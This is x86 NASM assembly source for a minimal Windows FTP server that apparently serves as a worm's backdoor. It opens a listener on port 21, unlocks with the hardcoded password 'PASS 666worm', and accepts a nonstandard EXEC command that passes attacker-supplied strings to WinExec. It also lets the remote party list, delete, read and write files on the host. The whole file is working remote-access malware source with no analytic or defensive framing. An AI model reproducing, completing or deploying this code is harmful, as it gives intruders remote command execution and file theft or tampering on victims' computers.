[BITS 32]

%define PORT	   21
%define PORT2	   10666
%define PASSWORD   "PASS 666worm"

%define NO_CODE_PTRS
%define MULTITHREAD

%define TIMEOUT	   120

%define jmps	   jmp short

%define CODE_BASE  1000h
%define imagebase  00400000h
%define RVADIFF    CODE_BASE-code_start
%define reloc      RVADIFF+imagebase

%macro hash32 1.nolist
	%assign %%hash 0
	%strlen %%len %1
	%assign %%i 1
	%rep %%len
		%assign %%hash ((%%hash << 7) & 0FFFFFFFFh) | (%%hash >> (32-7))
		%substr %%ch %1 %%i
		%assign %%hash ((%%hash ^ %%ch) & 0FFFFFFFFh)
		%assign %%i (%%i+1)
	%endrep
	dd %%hash
%endmacro

%macro cmp_ecx_hash 1.nolist
	db 81h,0f9h
hash32	%1
%endmacro

%macro cmp_hash 1.nolist
	db 03dh
hash32	%1
%endmacro

%include "peheader.inc"

list_fmt db "-rw-rw-rw",9,"1",9,"root",9,"root",9,"%d",9,"Sat",9,"1",9,"0:0",9,"%s",10,0
pasv_fmt db "227 passive (%d,%d,%d,%d,%d,%d)",10,0

welcome  db "220 ftpd",10,0
password db "331 psw",10,0
error 	 db "500 error",10,0
logged   db "230 logged",10,0
done  	 db "200 ok",10,0
datainit db "150 init",10,0
dataok   db "226 ok",10,0
restok   db "350 ok",10,0

dotdot   db "..",0
mask     db "*.*";0

align 512, db 0

code_start equ $

%include "import.inc"

code:
	sub ebp,ebp

	push ebp
	push ebp
	push ebp
	push ebp
	push ebp
	call dword [PeekMessageA]

	mov esi,200h
	sub esp,esi
	push esp
	push byte 1
	call dword [WSAStartup]
	add esp,esi

        call get_socket
	jz .error

	push ebp
	push ebp
	push ebp
	push dword ((PORT&0xFF)<<24)|(((PORT&0xFF00)>>8)<<16)+2
	mov esi,esp

        call bind_listen
	lea esp,[esp+4*4]
	jnz .error

  .wait4connect:
	push ebp
	push ebp
	push ebx
	call dword [accept]

%ifdef  MULTITHREAD
	push ebp
	push esp
	push ebp
	push eax
%ifdef  NO_CODE_PTRS
        call .reloc
        jmps ftpd_thread
  .reloc:
%else
	push dword ftpd_thread+reloc
%endif
	push ebp
	push ebp
	call dword [CreateThread]
%else
	push eax
        call ftpd_thread
%endif

	jmps .wait4connect

  .error:
	call dword [WSACleanup]

	push ebp
	call dword [ExitProcess]



bind_listen:
	push byte 16
	push esi
	push ebx
	call dword [bind]
	test eax,eax
	jnz .error

	push ebx
	push ebx
	call dword [listen]
	test eax,eax
  .error:
        ret



get_socket:
	push ebp
	push byte 1
	push byte 2
	call dword [socket]
	mov ebx,eax
	inc eax
        ret



set_sockaddr:
	mov di,2
	mov cl,7ch+4+4+4+4
	mov [esp+ecx],edi
	mov [esp+ecx+4],ebp
	sub ebp,ebp
        ret



ftpd_thread:
	pushad
	sub ebp,ebp
	mov ebx,[esp+(8*4)+4]

	push dword welcome+imagebase
	call send_data
	jz near .exit

	sub esp,byte 4*4
	push ebp
	push ebp
	push ebp
  .wait4command:
	push ebx
	push byte 1
	mov eax,esp

	push ebp
	push byte TIMEOUT

	push esp
	push ebp
	push ebp
	push eax
	push ebx
	call dword [select]
	add esp,byte 4*4
	dec eax
	jnz near .exit2

	sub esp,byte 7ch
	push esp
	call recv_data
	jz .je2exit3

	mov edx,esp
	sub ecx,ecx
	sub esi,esi
  .calchash:
        test esi,esi
        jnz .no2upcase
        cmp byte [edx],"a"
        jb .no2upcase
        cmp byte [edx],"z"
        ja .no2upcase
        and byte [edx],0dfh
  .no2upcase:
  	rol ecx,7
  	xor cl,[edx]
  	inc edx
        test esi,esi
        jnz .sethash
  	cmp byte [edx]," "
  	jne .sethash
  	mov eax,ecx
  	lea esi,[edx+1]
  .sethash:
  	cmp byte [edx],0
  	jne .calchash

	mov edi,dword logged+imagebase

	cmp_ecx_hash "QUIT"
  .je2exit3:
	je near .exit3

	cmp_ecx_hash PASSWORD
	jne .no_pass
	inc dword [esp+7ch]
	push edi
	jmps .jmp2sendinfo

  .no_pass:
	mov edx,[esp+7ch]
	test edx,edx
	jnz .logged
	add edi,byte (password-logged)
	push edi
	jmps .jmp2sendinfo

  .logged:
        cmp_hash "TYPE"
        je .done_ok

        cmp_hash "REST"
        jne .no_rest
        call ascii2value
        mov [esp+(7ch+4+4)+(eax-0d0h)],edx
	add edi,byte (restok-logged)
	push edi
	jmps .jmp2sendinfo
  .no_rest:

        cmp_ecx_hash "CDUP"
	jne .no_cdup

        add edi,byte (dotdot-logged)
	push edi
	jmps .chdir

  .no_cdup:
	cmp_hash "CWD"
	jne .no_cwd
	push esi
  .chdir:
	call dword [SetCurrentDirectoryA]
	jmps .done_ok_error

  .no_cwd:
	cmp_hash "DELE"
	jne .no_dele
	push esi
	call dword [DeleteFileA]

  .done_ok_error:
  	test eax,eax
  	jz near .done_error

  .done_ok:
	push dword done+imagebase
  .jmp2sendinfo:
	jmp .sendinfo

  .no_dele:
	cmp_hash "EXEC"
	jne .no_exec
	push ebp
	push esi
	call dword [WinExec]
	jmps .done_ok
  .no_exec:

	cmp_hash "PORT"
	jne .no_port

	push byte 6
	pop ecx
	sub edi,edi
  .port_cmd:
 	cmp cl,2
	jne .noportpart
	xchg edi,ebp
  .noportpart:
        call ascii2value
	or edi,edx
  	ror edi,8
	loop .port_cmd
        call set_sockaddr
        mov [esp+ecx+(7ch+4-(7ch+4+4+4+4))],ebp
	jmps .done_ok

  .no_port:
	cmp_ecx_hash "PASV"
	jne .no_pasv

        mov edx,((PORT2&0xFF)<<24)|(((PORT2&0xFF00)>>8)<<16)

	push byte 7ch
	pop esi
	sub esp,esi
	mov edi,esp

        push byte 6
        pop ecx
  .decimal:
        cmp cl,4
        jne .skipport
        push ecx

        push esi
        push edi
        call dword [gethostname]

        push edi
        call dword [gethostbyname]

        mov eax,[eax+16]
        mov edx,[eax]

        pop ecx
  .skipport:
        rol edx,8
        movzx eax,dl
        push eax
        loop .decimal

	push dword pasv_fmt+imagebase
	push edi
        call dword [wsprintfA]

	push edi
	call send_data

	lea esp,[esp+esi+8*4]

        mov edi,((PORT2&0xFF)<<24)|(((PORT2&0xFF00)>>8)<<16)
        sub ecx,ecx
        call set_sockaddr

        inc dword [esp+ecx+(7ch+4-(7ch+4+4+4+4))]
	jmp .wait4input

  .no_pasv:
	cmp_ecx_hash "LIST"
	jne .no_list

	push ebx
	call connect_data
	jnz .close_data_connection

	sub esp,144h+(260*2)
	lea esi,[esp+144h]

	push esp
	add edi,byte (mask-logged)
	push edi
	call dword [FindFirstFileA]
	mov edi,eax
	inc eax
  .search_next:
  	jz .done_list

	lea eax,[esp+2ch]
  	mov ecx,[esp+20h]

  	push eax
  	push ecx
  	push dword list_fmt+imagebase
  	push esi
  	call dword [wsprintfA]
  	add esp,byte 4*4

	test byte [esp],16
	jz .nodir
	mov byte [esi],'d'
  .nodir:

	push esi
	call send_data

	push esp
	push edi
	call dword [FindNextFileA]
	test eax,eax
	jmps .search_next

  .done_list:
	push edi
	call dword [FindClose]

	add esp,144h+(260*2)

  .close_data_connection:
	jnz .jnz2data_exit2

  .no_list:
	cmp_hash "RETR"
	jne .no_retr

	push byte 3
	pop ecx
	push byte 8
	pop eax
	call open
	jz .jz2done_error

	push ebx
	call connect_data
	jnz .jnz2data_exit2

	sub esp,byte 7ch
  	mov edi,esp
  .loop_read:
	push ebp

  	push ebp
  	mov ecx,esp
  	push ebp
  	push ecx
  	push byte 7ch
  	push edi
  	push esi
  	call dword [ReadFile]

	push edi
	push ebx
	call dword [send]
	xor al,7ch
	jz .loop_read
	jmps .data_exit

  .no_retr:
	cmp_hash "STOR"
	jne .done_error

	push byte 2
	pop ecx
	push byte 4
	pop eax
	call open
  .jz2done_error:
	jz .done_error

	push ebx
	call connect_data
  .jnz2data_exit2
	jnz .data_exit2

	sub esp,byte 7ch
  	mov edi,esp
  .loop_write:
	push ebp
	push byte 7ch
	push edi
	push ebx
	call dword [recv]
	inc eax
	jz .data_exit
	dec eax

	push ebp
	mov ecx,esp
  	push ebp
  	push ecx
  	push eax
  	push edi
  	push esi
  	call dword [WriteFile]
	pop eax

	test eax,eax
	jnz .loop_write

  .data_exit:
	add esp,byte 7ch
  	push esi
  	call dword [CloseHandle]

  .data_exit2:
	call close
	pop ebx
	push dword dataok+imagebase
	jmps .sendinfo

  .done_error:
        add edi,byte (error-logged)
	push edi

  .sendinfo:
	call send_data

  .wait4input:
	add esp,byte 7ch
	jmp .wait4command

  .exit3:
	add esp,byte 7ch

  .exit2:
  	add esp,byte 7*4

  .exit:
	call close
	jmps recv_data.exit



send_data:
	pushad
	mov esi,[esp+(8*4)+4]
	mov edi,esi
	sub ecx,ecx
  .count:
	lodsb
	test al,al
	jz .done
	inc ecx
	jmps .count
  .done:

	push ebp
	push ecx
	push edi
	push ebx
	call dword [send]

	inc eax
	jmps recv_data.exit



recv_data:
	pushad
	mov esi,[esp+(8*4)+4]

	push ebp
	push byte 7ch
	push esi
	push ebx
	call dword [recv]
	mov ecx,eax
	inc eax
	jz .exit

  .set0:
	lodsb
	test al,al
	jz .done
	sub al,10
	jz .done
	sub al,13-10
	jz .done
	loop .set0
  .done
  	mov [esi-1],ah

        inc eax
  .exit:
  	popad
	ret 4



ascii2value:
        sub eax,eax
  	cdq
  .convert:
	lodsb
	sub al,"0"
	jc .done
	cmp al,9
	ja .done
	imul edx,edx,byte 10
	add edx,eax
	jmps .convert
  .done:
        ret



connect_data:
	push dword datainit+imagebase
	call send_data

        call get_socket
	jnz .noerror
  .set_error:
	inc eax
	jmps .error
  .noerror:
	push esi

	push byte 7ch
	pop esi
	lea esi,[esp+esi+4+4+4+4]
	lodsd
	test eax,eax
	lodsd
	jz .no_pasv

        call bind_listen

	push ebp
	push ebp
	push ebx
	call dword [accept]

	push eax
	call close
	pop ebx
        mov eax,ebx
        inc eax
        pop esi
        jz .set_error
        sub eax,eax
        jmps .error

  .no_pasv:
	push byte 16
	push esi
	push ebx
	call dword [connect]
	pop esi

	test eax,eax
  .error:
	ret



close:
	push ebx
	call dword [closesocket]
	ret



open:
	push ebp
	push ebp
	push ecx
	push ebp
	push byte 1
	shl eax,28
	push eax
	push esi
	call dword [CreateFileA]
	mov esi,eax
	inc eax
	jz .error

        push byte 7ch
        pop eax
	push ebp
	push ebp
        push dword [esp+eax+4+4+4+(2*4)]
	push esi
	call dword [SetFilePointer]
	inc eax
  .error:
	ret


code_end equ $
